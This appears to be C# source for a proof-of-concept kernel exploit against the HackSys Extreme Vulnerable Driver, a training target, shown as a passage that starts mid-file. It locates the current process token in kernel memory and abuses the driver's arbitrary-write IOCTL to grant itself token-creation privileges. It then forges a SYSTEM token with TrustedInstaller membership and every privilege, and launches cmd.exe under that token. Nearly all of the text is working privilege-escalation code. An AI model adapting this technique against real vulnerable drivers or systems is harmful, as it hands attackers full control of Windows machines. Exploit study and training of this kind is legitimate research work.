            SYNC_AGENT = 0x0000000004000000UL, // SeSyncAgentPrivilege
            ENABLE_DELEGATION = 0x0000000008000000UL, // SeEnableDelegationPrivilege
            MANAGE_VOLUME = 0x0000000010000000UL, // SeManageVolumePrivilege
            IMPERSONATE = 0x0000000020000000UL, // SeImpersonatePrivilege
            CREATE_GLOBAL = 0x0000000040000000UL, // SeCreateGlobalPrivilege
            TRUSTED_CREDMAN_ACCESS = 0x0000000080000000UL, // SeTrustedCredManAccessPrivilege
            RELABEL = 0x0000000100000000UL, // SeRelabelPrivilege
            INCREASE_WORKING_SET = 0x0000000200000000UL, // SeIncreaseWorkingSetPrivilege
            TIME_ZONE = 0x0000000400000000UL, // SeTimeZonePrivilege
            CREATE_SYMBOLIC_LINK = 0x0000000800000000UL, // SeCreateSymbolicLinkPrivilege
            DELEGATE_SESSION_USER_IMPERSONATE = 0x0000001000000000UL, // SeDelegateSessionUserImpersonatePrivilege
            ALL = 0x0000001FFFFFFFFCUL
        }

        // User define functions
        static IntPtr CreateElevatedToken(
            TOKEN_TYPE tokenType,
            SECURITY_IMPERSONATION_LEVEL impersonationLevel)
        {
            int error;
            LUID authId = SYSTEM_LUID;
            var tokenSource = new TOKEN_SOURCE("*SYSTEM*");
            tokenSource.SourceIdentifier.HighPart = 0;
            tokenSource.SourceIdentifier.LowPart = 0;
            var privs = new string[] {
                SE_CREATE_TOKEN_NAME,
                SE_ASSIGNPRIMARYTOKEN_NAME,
                SE_LOCK_MEMORY_NAME,
                SE_INCREASE_QUOTA_NAME,
                SE_MACHINE_ACCOUNT_NAME,
                SE_TCB_NAME,
                SE_SECURITY_NAME,
                SE_TAKE_OWNERSHIP_NAME,
                SE_LOAD_DRIVER_NAME,
                SE_SYSTEM_PROFILE_NAME,
                SE_SYSTEMTIME_NAME,
                SE_PROFILE_SINGLE_PROCESS_NAME,
                SE_INCREASE_BASE_PRIORITY_NAME,
                SE_CREATE_PAGEFILE_NAME,
                SE_CREATE_PERMANENT_NAME,
                SE_BACKUP_NAME,
                SE_RESTORE_NAME,
                SE_SHUTDOWN_NAME,
                SE_DEBUG_NAME,
                SE_AUDIT_NAME,
                SE_SYSTEM_ENVIRONMENT_NAME,
                SE_CHANGE_NOTIFY_NAME,
                SE_REMOTE_SHUTDOWN_NAME,
                SE_UNDOCK_NAME,
                SE_SYNC_AGENT_NAME,
                SE_ENABLE_DELEGATION_NAME,
                SE_MANAGE_VOLUME_NAME,
                SE_IMPERSONATE_NAME,
                SE_CREATE_GLOBAL_NAME,
                SE_TRUSTED_CREDMAN_ACCESS_NAME,
                SE_RELABEL_NAME,
                SE_INCREASE_WORKING_SET_NAME,
                SE_TIME_ZONE_NAME,
                SE_CREATE_SYMBOLIC_LINK_NAME,
                SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
            };

            Console.WriteLine("[>] Trying to create an elevated {0} token.",
                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");

            if (!ConvertStringSidToSid(
                DOMAIN_ALIAS_RID_ADMINS,
                out IntPtr pAdministrators))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for Administrators.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                LOCAL_SYSTEM_RID,
                out IntPtr pLocalSystem))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for LocalSystem.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                SYSTEM_MANDATORY_LEVEL,
                out IntPtr pSystemIntegrity))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for LocalSystem.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                TRUSTED_INSTALLER_RID,
                out IntPtr pTrustedInstaller))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get SID for TrustedInstaller.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!CreateTokenPrivileges(
                privs,
                out TOKEN_PRIVILEGES tokenPrivileges))
            {
                return IntPtr.Zero;
            }

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            IntPtr pTokenGroups = GetInformationFromToken(
                hCurrentToken,
                TOKEN_INFORMATION_CLASS.TokenGroups);
            IntPtr pTokenDefaultDacl = GetInformationFromToken(
                hCurrentToken,
                TOKEN_INFORMATION_CLASS.TokenDefaultDacl);

            if (pTokenDefaultDacl == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get current token information.");

                return IntPtr.Zero;
            }
            var tokenUser = new TOKEN_USER(pLocalSystem);
            var tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
                pTokenGroups,
                typeof(TOKEN_GROUPS));
            var tokenOwner = new TOKEN_OWNER(pAdministrators);
            var tokenPrimaryGroup = new TOKEN_PRIMARY_GROUP(pLocalSystem);
            var tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
                pTokenDefaultDacl,
                typeof(TOKEN_DEFAULT_DACL));

            StringComparison opt = StringComparison.OrdinalIgnoreCase;
            uint groupOwnerAttrs = (uint)(
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
                SE_GROUP_ATTRIBUTES.SE_GROUP_OWNER);
            uint groupEnabledAttrs = (uint)(
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED);
            bool isAdmin = false;
            bool isSystem = false;

            for (var idx = 0; idx < tokenGroups.GroupCount; idx++)
            {
                ConvertSidToStringSid(
                    tokenGroups.Groups[idx].Sid,
                    out string strSid);

                if (string.Compare(strSid, DOMAIN_ALIAS_RID_ADMINS, opt) == 0)
                {
                    isAdmin = true;

                    if (tokenGroups.Groups[idx].Attributes != groupOwnerAttrs)
                        tokenGroups.Groups[idx].Attributes = groupOwnerAttrs;
                }
                else if (string.Compare(strSid, LOCAL_SYSTEM_RID, opt) == 0)
                {
                    isSystem = true;
                }
                else if (string.Compare(strSid, UNTRUSTED_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, LOW_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, MEDIUM_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, MEDIUM_PLUS_MANDATORY_LEVEL, opt) == 0 |
                    string.Compare(strSid, HIGH_MANDATORY_LEVEL, opt) == 0)
                {
                    tokenGroups.Groups[idx].Sid = pSystemIntegrity;
                }
            }

            tokenGroups.Groups[tokenGroups.GroupCount].Sid = pTrustedInstaller;
            tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupOwnerAttrs;
            tokenGroups.GroupCount++;

            if (!isAdmin)
            {
                tokenGroups.Groups[tokenGroups.GroupCount].Sid = pAdministrators;
                tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupOwnerAttrs;
                tokenGroups.GroupCount++;
            }

            if (!isSystem)
            {
                tokenGroups.Groups[tokenGroups.GroupCount].Sid = pLocalSystem;
                tokenGroups.Groups[tokenGroups.GroupCount].Attributes = groupEnabledAttrs;
                tokenGroups.GroupCount++;
            }

            var expirationTime = new LARGE_INTEGER(-1L);
            var sqos = new SECURITY_QUALITY_OF_SERVICE(
                impersonationLevel,
                SECURITY_STATIC_TRACKING,
                0);
            var oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
            IntPtr pSqos = Marshal.AllocHGlobal(Marshal.SizeOf(sqos));
            Marshal.StructureToPtr(sqos, pSqos, true);
            oa.SecurityQualityOfService = pSqos;

            uint ntstatus = ZwCreateToken(
                out IntPtr hToken,
                TokenAccessFlags.TOKEN_ALL_ACCESS,
                ref oa,
                tokenType,
                ref authId,
                ref expirationTime,
                ref tokenUser,
                ref tokenGroups,
                ref tokenPrivileges,
                ref tokenOwner,
                ref tokenPrimaryGroup,
                ref tokenDefaultDacl,
                ref tokenSource);

            LocalFree(pTokenGroups);
            LocalFree(pTokenDefaultDacl);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create elevated token.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage((int)ntstatus, true));

                return IntPtr.Zero;
            }

            Console.WriteLine("[+] An elevated {0} token is created successfully.",
                tokenType == TOKEN_TYPE.TokenPrimary ? "primary" : "impersonation");

            return hToken;
        }


        static bool CreateTokenAssignedProcess(
            IntPtr hToken,
            string command)
        {
            int error;
            var startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpDesktop = "Winsta0\\Default";

            Console.WriteLine("[>] Trying to create a token assigned process.\n");

            if (!CreateProcessAsUser(
                hToken,
                null,
                command,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                Environment.CurrentDirectory,
                ref startupInfo,
                out PROCESS_INFORMATION processInformation))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to create new process.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }

            WaitForSingleObject(processInformation.hProcess, uint.MaxValue);
            CloseHandle(processInformation.hThread);
            CloseHandle(processInformation.hProcess);

            return true;
        }


        static bool CreateTokenPrivileges(
            string[] privs,
            out TOKEN_PRIVILEGES tokenPrivileges)
        {
            int error;
            int sizeOfStruct = Marshal.SizeOf(typeof(TOKEN_PRIVILEGES));
            IntPtr pPrivileges = Marshal.AllocHGlobal(sizeOfStruct);

            tokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(
                pPrivileges,
                typeof(TOKEN_PRIVILEGES));
            tokenPrivileges.PrivilegeCount = privs.Length;

            for (var idx = 0; idx < tokenPrivileges.PrivilegeCount; idx++)
            {
                if (!LookupPrivilegeValue(
                    null,
                    privs[idx],
                    out LUID luid))
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to lookup LUID for {0}.", privs[idx]);
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                    return false;
                }

                tokenPrivileges.Privileges[idx].Attributes = (uint)(
                    SE_PRIVILEGE_ATTRIBUTES.SE_PRIVILEGE_ENABLED |
                    SE_PRIVILEGE_ATTRIBUTES.SE_PRIVILEGE_ENABLED_BY_DEFAULT);
                tokenPrivileges.Privileges[idx].Luid = luid;
            }

            return true;
        }


        static IntPtr GetCurrentProcessTokenPointer()
        {
            uint ntstatus;
            var pObject = IntPtr.Zero;
            var hToken = WindowsIdentity.GetCurrent().Token;

            Console.WriteLine("[+] Got a handle of current process token.");
            Console.WriteLine("    |-> hToken: 0x{0}", hToken.ToString("X"));
            Console.WriteLine("[>] Trying to retrieve system information.");

            int systemInformationLength = 1024;
            IntPtr infoBuffer;

            do
            {
                infoBuffer = Marshal.AllocHGlobal(systemInformationLength);
                ZeroMemory(infoBuffer, systemInformationLength);

                ntstatus = NtQuerySystemInformation(
                    SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
                    infoBuffer,
                    systemInformationLength,
                    ref systemInformationLength);

                if (ntstatus != STATUS_SUCCESS)
                    Marshal.FreeHGlobal(infoBuffer);
            } while (ntstatus == STATUS_INFO_LENGTH_MISMATCH);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get system information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage((int)ntstatus, true));

                return IntPtr.Zero;
            }

            var entryCount = Marshal.ReadInt32(infoBuffer);
            Console.WriteLine("[+] Got {0} entries.", entryCount);

            var pid = Process.GetCurrentProcess().Id;
            var entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
            var entrySize = Marshal.SizeOf(entry);
            var pEntryOffset = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);
            IntPtr uniqueProcessId;
            IntPtr handleValue;

            Console.WriteLine("[>] Searching our process entry (PID = {0}).", pid);

            for (var idx = 0; idx < entryCount; idx++)
            {
                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
                    pEntryOffset,
                    entry.GetType());
                uniqueProcessId = entry.UniqueProcessId;
                handleValue = entry.HandleValue;

                if (uniqueProcessId == new IntPtr(pid) && handleValue == hToken)
                {
                    pObject = entry.Object;
                    Console.WriteLine("[+] Got our entry.");
                    Console.WriteLine("    |-> Object: 0x{0}", pObject.ToString("X16"));
                    Console.WriteLine("    |-> UniqueProcessId: {0}", uniqueProcessId);
                    Console.WriteLine("    |-> HandleValue: 0x{0}", handleValue.ToString("X"));

                    break;
                }

                pEntryOffset = new IntPtr(pEntryOffset.ToInt64() + entrySize);
            }

            if (pObject == IntPtr.Zero)
                Console.WriteLine("[-] Failed to get target entry.\n");

            Marshal.FreeHGlobal(infoBuffer);
            CloseHandle(hToken);

            return pObject;
        }


        static IntPtr GetDeviceHandle(string deviceName)
        {
            int error;

            Console.WriteLine("[>] Trying to open device driver.");
            Console.WriteLine("    |-> Device Path : {0}", deviceName);

            IntPtr hDevice = CreateFile(
                deviceName,
                FileAccess.ReadWrite,
                FileShare.ReadWrite,
                IntPtr.Zero,
                FileMode.Open,
                FileAttributes.Normal,
                IntPtr.Zero);

            if (hDevice == INVALID_HANDLE_VALUE)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get device handle.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            Console.WriteLine("[+] Got a device handle.");
            Console.WriteLine("    |-> hDevice: 0x{0}", hDevice.ToString("X"));

            return hDevice;
        }


        static IntPtr GetInformationFromToken(
            IntPtr hToken,
            TOKEN_INFORMATION_CLASS tokenInfoClass)
        {
            bool status;
            int error;
            int length = 4;
            IntPtr buffer;

            do
            {
                buffer = Marshal.AllocHGlobal(length);
                ZeroMemory(buffer, length);
                status = GetTokenInformation(
                    hToken, tokenInfoClass, buffer, length, out length);
                error = Marshal.GetLastWin32Error();

                if (!status)
                    Marshal.FreeHGlobal(buffer);
            } while (!status && (error == ERROR_INSUFFICIENT_BUFFER || error == ERROR_BAD_LENGTH));

            if (!status)
                return IntPtr.Zero;

            return buffer;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            var message = new StringBuilder();
            var messageSize = 255;
            FormatMessageFlags messageFlag;
            IntPtr pNtdll;
            message.Capacity = messageSize;

            if (isNtStatus)
            {
                pNtdll = LoadLibrary("ntdll.dll");
                messageFlag = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                pNtdll = IntPtr.Zero;
                messageFlag = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            uint ret = FormatMessage(
                messageFlag,
                pNtdll,
                code,
                0,
                message,
                messageSize,
                IntPtr.Zero);

            if (isNtStatus)
                FreeLibrary(pNtdll);

            if (ret == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static void OverwriteTokenPrivileges(
            IntPtr hDevice,
            IntPtr tokenPointer,
            ulong privValue)
        {
            IntPtr pParent = new IntPtr(tokenPointer.ToInt64() + 0x40);
            IntPtr pEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48);

            Console.WriteLine("[>] Trying to overwrite token.");

            WritePointer(hDevice, pParent, new IntPtr((long)privValue));
            WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));
        }


        static void WritePointer(IntPtr hDevice, IntPtr where, IntPtr what)
        {
            uint ioctl = 0x22200B;
            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
            IntPtr whatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.Copy(BitConverter.GetBytes(what.ToInt64()), 0, whatBuffer, IntPtr.Size);
            IntPtr[] inputArray = new IntPtr[2];
            inputArray[0] = whatBuffer; // what
            inputArray[1] = where; // where
            Marshal.Copy(inputArray, 0, inputBuffer, 2);

            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);

            Marshal.FreeHGlobal(whatBuffer);
            Marshal.FreeHGlobal(inputBuffer);
        }


        static void ZeroMemory(IntPtr buffer, int size)
        {
            var nullBytes = new byte[size];
            Marshal.Copy(nullBytes, 0, buffer, size);
        }


        static void Main()
        {
            Console.WriteLine("--[ HEVD Kernel Write PoC : SeCreateTokenPrivilege And SeAssignPrimaryTokenPrivilege\n");

            if (!Environment.Is64BitOperatingSystem)
            {
                Console.WriteLine("[!] 32 bit OS is not supported.\n");

                return;
            }
            else if (IntPtr.Size != 8)
            {
                Console.WriteLine("[!] Should be built with 64 bit pointer.\n");

                return;
            }

            IntPtr tokenPointer = GetCurrentProcessTokenPointer();

            if (tokenPointer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                return;
            }

            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";

            IntPtr hDevice = GetDeviceHandle(deviceName);

            if (hDevice == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open {0}", deviceName);

                return;
            }

            var privs = (ulong)(SepTokenPrivilegesFlags.CREATE_TOKEN |
                SepTokenPrivilegesFlags.ASSIGNPRIMARYTOKEN);

            OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
            CloseHandle(hDevice);

            IntPtr hElevatedToken = CreateElevatedToken(
                TOKEN_TYPE.TokenPrimary,
                SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous);

            if (hElevatedToken == IntPtr.Zero)
                return;

            CreateTokenAssignedProcess(
                hElevatedToken,
                "C:\\Windows\\System32\\cmd.exe");

            CloseHandle(hElevatedToken);
        }
    }
}
